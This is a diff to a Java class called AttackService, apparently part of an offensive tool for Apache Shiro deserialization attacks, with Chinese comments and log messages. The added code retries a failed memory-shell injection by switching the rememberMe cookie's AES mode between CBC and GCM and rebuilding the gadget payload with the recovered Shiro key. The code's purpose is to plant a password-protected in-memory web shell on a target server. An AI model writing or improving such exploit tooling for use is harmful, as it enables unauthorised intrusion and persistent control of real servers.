@@ -769,7 +769,23 @@ public class AttackService {
                     logArea.appendText(Utils.log("-------------------------------------------------"));
                     return;
                 }
-                this.injectMemWithCookieAndUserBody(injectRememberMe, b64Bytecode, shellPass, shellPath, logArea, changeKeyMode, memShellType);
+                String result = this.injectMemWithCookieAndUserBody(injectRememberMe, b64Bytecode, shellPass, shellPath, logArea, changeKeyMode, memShellType);
+                // 如果失败且响应含 deleteMe，切换 AES 模式重试
+                if (result != null && result.contains("=deleteMe") && !result.contains("->|Success|<-")) {
+                    int altMode = aesGcmCipherType == 0 ? 1 : 0;
+                    logArea.appendText(Utils.log("[*] 切换 AES 模式为 " + (altMode == 1 ? "GCM" : "CBC") + " 重试..."));
+                    int origMode = aesGcmCipherType;
+                    aesGcmCipherType = altMode;
+                    String retryRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
+                    if (retryRememberMe != null) {
+                        result = this.injectMemWithCookieAndUserBody(retryRememberMe, b64Bytecode, shellPass, shellPath, logArea, changeKeyMode, memShellType);
+                        if (result != null && result.contains("=deleteMe") && !result.contains("->|Success|<-")) {
+                            aesGcmCipherType = origMode; // 恢复原模式
+                        }
+                    } else {
+                        aesGcmCipherType = origMode;
+                    }
+                }
                 logArea.appendText(Utils.log("-------------------------------------------------"));
             } catch (Exception var10) {
                 logArea.appendText(Utils.log("[异常] " + var10.getMessage()));
